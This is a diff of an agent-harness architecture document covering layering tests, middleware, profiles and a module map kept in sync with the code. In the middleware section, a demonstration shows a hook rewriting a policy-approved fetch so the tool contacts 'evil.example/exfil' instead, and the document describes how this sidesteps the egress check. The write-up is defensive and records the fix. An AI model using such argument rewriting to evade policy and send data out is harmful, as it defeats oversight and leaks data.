@@ -31,8 +31,24 @@ is what makes caching work, which is the single largest cost lever in the system
 ```
 
 Dependencies point **downward only**. L2 knows the L1 protocols and never the L0 adapters —
-this is what makes the whole system testable with fakes, and it is enforced by an
-import-linter rule in CI ([§09.6](09-testing.md)), not by discipline.
+this is what makes the whole system testable with fakes, and it is enforced by
+`tests/test_layering.py::L2NeverNamesAnL0Adapter`, not by discipline.
+
+That sentence used to name an **import-linter rule in CI**, and there was no such rule:
+`grep -rn "import-linter"` hit three `.md` files and nothing else — no `.importlinter`,
+nothing in `pyproject.toml`, not in the dev dependencies. The property held nearly
+everywhere and was checked nowhere. Two things are true about it that a bare "never" hid:
+
+* A **composition root** is supposed to know concrete types — `agent.py` building the
+  exporters a run gets, `cli`, `server`, `credentials` resolving a provider name, the
+  `testing` kit handing out fakes. Forbidding that would only move the wiring behind the
+  factory §8 below rejects.
+* Three modules are neither composition roots nor compliant, and the test names them as
+  KNOWN GAPs rather than excluding them quietly: `dispatch.py` hard-wires
+  `InMemoryStore` for idempotency dedup **without** exposing `idempotency_store=`, which
+  `lg/runtime.py` does — the same capability, two backends, one switch; `tools/code.py`
+  picks `Subprocess` rather than taking a `Sandbox`; and `contrib/driver.py` imports
+  `FakeModel` for the demo its own tier rule says belongs in `examples/`.
 
 ## 3. The run loop
 
@@ -189,14 +205,61 @@ tool's own callable, `Exporter`) — a `Middleware` base class with five optiona
 (`before_model`/`after_model`/`before_tool`/`after_tool`/`on_event`) that
 `with_middleware(agent, *middlewares)` wires onto a new `Agent`. It is not a seventh
 seam and not the middleware chain rejected below: every hook runs strictly *after* the
-core decision it follows (`before_tool` never sees a call `Policy` already denied), so
-stacking many of these can only add restriction or observation, never bypass one.
+core decision it follows (`before_tool` never sees a call `Policy` already denied).
+
+That parenthetical is true; the conclusion this sentence used to draw from it — that
+stacking many of these "can only add restriction or observation, never bypass one" — was
+not. `before_tool` returns the kwargs the tool is then called with, so a hook cannot
+bypass a **verdict** but can change the **subject** of one. Measured with
+`allowed_hosts=["docs.python.org"]` and a six-line middleware:
+
+```
+policy.decided:                     [('fetch', 'ALLOW', '')]
+tool.requested arguments:           [{'url': 'http://docs.python.org/x'}]
+the URL the tool was actually called with:  ['http://evil.example/exfil']
+```
+
+So a `Middleware` is **as privileged as the policy set**, and belongs on the trust
+boundary list in §6 rather than in the "observation only" bucket. Rewriting arguments is
+a real and useful power (redaction, defaulting, tenant scoping); the defect was that it
+happened silently, leaving the transcript asserting an argument set that never ran. Every
+rewrite now emits `tool.arguments_amended` naming the middleware and the fields it
+changed (docs/05 §…), so "what was approved" and "what ran" stay two comparable facts.
 `docs/03-public-api.md §3.6` documents it as a Level-3 extension.
+
+**`Agent.with_profile()`** is the same shape of sugar for a different recurring need:
+packaging a system prompt, a tool set, a model/effort/budget choice, and policies as one
+named, reusable unit, without a second way to construct an `Agent`. `Profile` (`profile.py`)
+is a two-member `Protocol` — `name: str`, `apply(agent) -> Agent` — built entirely from
+`Agent.with_()`; nothing in the run loop knows it exists. What earns it the "sugar, not a
+seam" label is the same discipline `Middleware` follows: `Agent.with_profile()` refuses
+the result of `profile.apply()` if it loosened a safety knob the caller's own `Agent(...)`
+call already set (`ProfileLoosenedSafetyError` — ADR-073), so stacking a profile on top of
+an agent can only add capability, never bypass a decision already made. Two genuinely
+different profiles ship as evidence the abstraction generalizes rather than merely
+naming one shape twice: `examples/coding_profile.py` (file/git tools, a verification
+wrapper, a subagent, a path policy) and `examples/research_profile.py` (two `external`
+tools, a citation-and-skepticism prompt, no subagent, no write tools).
 
 ## 5. Module map
 
-Every module below maps to at least one task in [§11](11-implementation-plan.md). Nothing
-in the plan creates a file that is not on this map.
+Every module in `src/harness/` is below, and nothing is below that is not in
+`src/harness/`. That is now a test — `tests/test_gates_module_map.py` parses this block
+and diffs it against the tree — because the sentence that used to be here, *"Nothing in
+the plan creates a file that is not on this map,"* had stopped being true and nothing
+said so:
+
+| | measured before ADR-114 |
+|---|---|
+| on the map, not on disk | 7 — `_typing.py`, `context/caching.py`, `observe/bus.py`, `observe/redact.py`, `tools/invoke.py`, `tools/builtin/math.py`, `tools/builtin/shell.py` |
+| on disk, not on the map | 47 — including `guards.py`, `dispatch.py`, `audit.py`, `credentials.py`, `policy/decision.py`, `sandbox.py`, `session.py`, `stop.py`, and the whole of `lg/`, `server/`, `mcp/`, `eval/` and `contrib/` |
+
+Every safety-critical module added after roughly Round 28 was absent, including
+`guards.py` — the module ADR-098 is *about*. A map that omits the guards is worse than no
+map, because a reader who consults it concludes they do not exist.
+
+The one-line descriptions are the first line of each module's own docstring, so they
+cannot drift from the module either.
 
 Kept in sync with the real tree as of H-4, `design/review-architect-round3.md` — the
 prior version was missing roughly a dozen modules added since M6-M10 and named six files
@@ -206,118 +269,106 @@ that never existed (`_typing.py`, `tools/invoke.py`, `context/caching.py`,
 
 ```
 src/harness/
-  __init__.py           PUBLIC API — the complete stable surface (see §03)
-  agent.py              Agent: frozen config, construction-time validation
-  run.py                RunEngine: the loop of §3, capped at 251 non-comment lines
-                        (IDL-13). No cleverness allowed.
-  dispatch.py           Tool dispatch — split out of run.py in Round 28: gating,
-                        parallel/serial scheduling, timeout, truncation, retry wiring.
-                        Same IDL-13 line cap, tracked separately from run.py's.
-  result.py             Result, StopReason, Usage, Step
-  errors.py             Exception hierarchy (§04.7)
-  _value.py             @value — the frozen, slotted value-type decorator used by every
-                        data class in the package (clean errors on a typo'd attribute)
-  middleware.py         Middleware base class + with_middleware() — sugar composed from
-                        ModelProvider/tool/Exporter (§4), not a seventh seam, not the loop
-  retry.py              with_provider_retry() — the ONE place provider-call retry lives,
-                        shared by both backends (rate limit/timeout/unavailable)
-  idempotency.py        execute_once — idempotency key + replay-on-hit, backed by Store
-  progress.py           ProgressLedger — mechanical stuck-agent detection (repeated
-                        tool calls with no new args), no extra model call
-  tasks.py              TaskLedger — durable task list for a long-running session,
-                        backed by Store (not a planner, ADR-023 still stands)
-  session.py            Session — id/owner/TTL/fork over the classic backend's Chat;
-                        the LangGraph backend uses its own checkpointer thread_id instead
-  sandbox.py            Sandbox seam (ADR-047): InProcess / Subprocess, isolation field
-  workspace.py          confine() — resolve-then-check root confinement for file-touching
-                        tools (T-7.1); refuses an escaping path rather than sanitizing it
-
-  tools/
-    __init__.py         @tool decorator, Effect, ToolSpec (incl. isolation), EFFECT_PROFILES
-    schema.py           Python signature → JSON Schema (strict-compatible)
-    registry.py         ToolSet: sorted tuple + name index, deterministic serialization
-                        (not a frozenset — ToolSpec holds a Mapping and is unhashable)
-    code.py             CodeTools — file/search/outline/write/test/git tools confined to
-                        a workspace root, sandbox-routed where they shell out
-    calc.py, files.py, web.py
-                        Backward-compat re-export shims onto tools/builtin/*
-    builtin/
-      web.py            search, fetch          (effect=external, pre-classified)
-      files.py          read_file, write_file  (read / write)
-      calc.py           calculate              (read; bounded Pow, G-4)
-
-  models/
-    base.py             ModelProvider protocol, ModelRequest/Response, Price
-    anthropic.py        The v1 implementation
-    pricing.py          Per-model $/MTok table with `as_of`; cost arithmetic in Decimal
-    fake.py             FakeModel — re-exported by harness.testing
-
-  context/
-    assembler.py        Renders tools → system → messages. Deterministic by construction.
-    linter.py            Double-render byte comparison → NonDeterministicPromptError
-    window.py            Growth policy: context editing, then compaction
-
+  __init__.py         Harness — build agents that are cheap to run, hard to misuse, and easy to …
+  _value.py           `@value` — the frozen value-type decorator used throughout the package
+  agent.py            Agent — the public facade
+  audit.py            The audit trail — the one place a verdict becomes an artifact
+  credentials.py      Where a credential comes from, and which provider that yields — one module…
+  dispatch.py         Tool dispatch — split out of run.py in Round 28
+  errors.py           Exception hierarchy — docs/04-interfaces.md §7
+  findings.py         `FindingsLog` — the other half of what a long exploratory session needs to…
+  guards.py           Construction-time guards — the rules that decide whether an `Agent` may ex…
+  idempotency.py      T-6.1 — idempotency key + `execute_once` contract, docs/17-research-alignm…
+  middleware.py       Middleware — compose behavior around every model/tool call, framework-mana…
+  profile.py          `Profile` — a named, reusable way to turn one `Agent` into another
+  progress.py         `ProgressLedger` — phát hiện agent đứng yên, bằng dữ liệu harness đã có, k…
+  result.py           Core value types — docs/04-interfaces.md §0
+  retry.py            Provider-level retry — N-5, docs/10-observability-ops.md §3
+  run.py              RunEngine — the loop
+  sandbox.py          T-7.3/T-7.4 — the `Sandbox` seam, docs/17-research-alignment.md M7
+  secrets.py          Secret — docs/06-safety.md §5
+  session.py          T-8.6 — `Session` as a first-class resource, docs/17-research-alignment.md…
+  stop.py             Stop reasons, the ceiling on pauses, and the `returns=` parser — the vocab…
+  subagent.py         Running a tool that is itself an agent, and nesting its budget into the pa…
+  tasks.py            `TaskLedger` — sổ công việc bền cho một phiên chạy dài
+  workspace.py        T-7.1 — workspace root confinement, docs/17-research-alignment.md M7
   budget/
-    ledger.py           Budget, Ledger, reserve/settle/settle_worst_case/
-                        settle_after_retries, worst-case estimation
-
-  policy/
-    base.py             Policy protocol, Verdict lattice (ALLOW < ASK < DENY)
-    engine.py           Composition: max() of verdicts, short-circuit on DENY,
-                        then approval resolution for a surviving ASK (ADR-021 —
-                        approval is the engine's job; a policy is sync and pure)
-    builtin.py          EffectPolicy, TaintPolicy, EgressPolicy
-    taint.py            TaintTracker — classic backend's sticky integrity bool
-    decision.py         Decision — append-only approval record; Actor has no Model variant
-    label.py            Label — two-axis integrity × confidentiality lattice
-
-  memory/
-    base.py             Store protocol
-    viking.py           OpenViking — semantic recall; `recall` is `external` (ADR-035)
-    inmemory.py         Dict-backed
-    sqlite.py           SQLite-backed (default persistent store)
-
-  observe/
-    events.py           The closed event taxonomy (§05.1) + EventBus: sync fan-out,
-                        exporter isolation
-    transcript.py       Append-only JSONL writer/reader, with redaction
-    console.py          Human-readable exporter
-    otel.py             OpenTelemetry exporter (optional extra)
-
-  secrets.py            Secret type
-
-  plugins/
-    __init__.py         Re-exports PluginRegistry, register
-    registry.py         Explicit registration; opt-in entry-point discovery
-
-  lg/                    harness[graph] — the LangGraph-backed second engine (§3.1)
-    __init__.py          build_agent(), unguarded_paths() — the reachability proof
-    graph.py             The compiled enforcement graph's topology
-    runtime.py           Node implementations: budget/model/policy/approve/tools/finish
-    adapter.py           ProviderChatModel — wraps this Agent's own ModelProvider as a
-                        LangChain chat model, one seam for both backends
-    state.py             AgentState — the TypedDict a checkpointer persists
-
-  eval/                  harness.eval (M10) — trajectory contracts, golden sets, benchmarks
-    trajectory.py        Trajectory contract + check_trajectory (pure, given a Result)
-    golden.py            GoldenCase, run_golden_set — pass rate with a Wilson-score CI
-    benchmark.py         benchmark(), import_cold_start_ms() — latency/throughput/cold start
-    cost.py              cost_per_success — Wilson interval math shared by golden.py
-
-  mcp/
-    __init__.py          MCP client — embeds third-party MCP servers as tools; never hosts one
-
-  server/
-    __init__.py          Service API (harness[server]): POST /v1/runs and friends,
-                        single-worker only (G-10) — never imported by `import harness`
-
-  testing/
-    __init__.py         FakeModel, record, replay, no_network, assert_* helpers
-    chaos.py             Failure injection: provider timeout, tool raise, store dead,
-                        policy raise, garbage model output
-
+    __init__.py       
+    ledger.py         Budget and Ledger — docs/04-interfaces.md §4, task T-1.5
   cli/
-    __init__.py         new · run · trace · cost · doctor
+    __init__.py       The CLI — tasks T-0.8 and T-5.1
+  context/
+    __init__.py       
+    assembler.py      Deterministic prefix rendering — task T-2.2
+    linter.py         Cache determinism checking — task T-2.3, revised by ADR-025
+    window.py         Context growth policy — task T-2.6
+  contrib/
+    __init__.py       Shipped, reusable, and explicitly NOT covered by the compatibility promise…
+    calibration.py    A threshold from labelled pairs — or the refusal to hand one over
+    driver.py         `Driver` — runtime events handled by PRIORITY: preempt what matters, queue…
+    output_shaping.py Fixes a real, measured bug in the "long, exploratory, many trial-and-error…
+    sensors.py        Two more `Sensor` implementations, so the abstraction is tested by more th…
+  eval/
+    __init__.py       
+    benchmark.py      T-10.3 — performance benchmark, docs/17-research-alignment.md M10 / Y-05
+    cost.py           T-8.4 — cost per successful task, docs/17-research-alignment.md M8 / S-06
+    golden.py         T-10.2 — golden set + pass rate with a confidence interval, docs/17-resear…
+    trajectory.py     T-10.1 — trajectory contract, docs/17-research-alignment.md M10
+  lg/
+    __init__.py       LangGraph backend — Round 35
+    adapter.py        `Agent(durable=True)` — the LangGraph backend behind the classic backend's…
+    graph.py          The enforcement graph — Round 35
+    runtime.py        Node implementations — Round 35
+    state.py          State the graph carries — Round 35
+  mcp/
+    __init__.py       MCP client — a harness EMBEDS third-party MCP servers as tools; it never h…
+  memory/
+    __init__.py       
+    base.py           Store protocol — docs/04-interfaces.md §5, task T-4.2
+    inmemory.py       Dict-backed Store
+    sqlite.py         SQLite-backed Store — schema in docs/05-data-and-state.md §5
+    viking.py         OpenViking store — Round 36, task T-4.4
+  models/
+    __init__.py       
+    anthropic.py      The Anthropic provider — task T-0.4
+    base.py           ModelProvider protocol and request/response types — docs/04-interfaces.md …
+    fake.py           FakeModel — task T-0.7
+    pricing.py        Per-model prices — task T-2.1
+  observe/
+    __init__.py       
+    console.py        Human-readable progress — ADR-014
+    events.py         Event taxonomy and bus — docs/05-data-and-state.md §1, task T-3.1
+    otel.py           T-8.3 — a real OTel exporter, docs/10-observability-ops.md §2 (already spe…
+    transcript.py     Append-only JSONL transcript — task T-3.2
+  plugins/
+    __init__.py       
+    registry.py       Plugin registry — task T-4.1, ADR-008
+  policy/
+    __init__.py       
+    base.py           Verdict lattice and Policy protocol — docs/04-interfaces.md §3
+    builtin.py        Built-in policies — docs/04-interfaces.md §3
+    decision.py       Bản ghi phê duyệt — design/00-foundation.md §4, design/02-safety-engine.md
+    engine.py         Policy composition — docs/04-interfaces.md §3
+    label.py          Label — nhãn hai chiều, design/00-foundation.md §3.2, design/02-safety-eng…
+    taint.py          Taint tracking cho backend cổ điển — ADR-011, nâng cấp lên `Label` hai trục
+  server/
+    __init__.py       Service API — `POST /v1/runs`, `GET /v1/runs/{id}`, `GET /v1/runs/{id}/eve…
+  testing/
+    __init__.py       Test helpers — task T-0.7
+    chaos.py          M6/T-6.4 — failure injection, docs/17-research-alignment.md
+  tools/
+    __init__.py       @tool, Effect, ToolSpec — docs/04-interfaces.md §1, tasks T-0.2 and T-1.1
+    calc.py           
+    code.py           `CodeTools` — bộ tool cho một agent làm việc với code, đã phân loại effect…
+    files.py          
+    registry.py       ToolSet — task T-0.3
+    schema.py         Python signature -> JSON Schema — docs/04-interfaces.md §1, task T-0.2
+    web.py            `from harness.tools.web import search` — the import §15 tells a child to w…
+    builtin/
+      __init__.py     Pre-classified starter tools
+      calc.py         Arithmetic, evaluated without `eval`
+      files.py        Local file tools
+      web.py          Web tools — effect="external", so their output taints the run (ADR-011)
 ```
 
 ## 6. Concurrency model
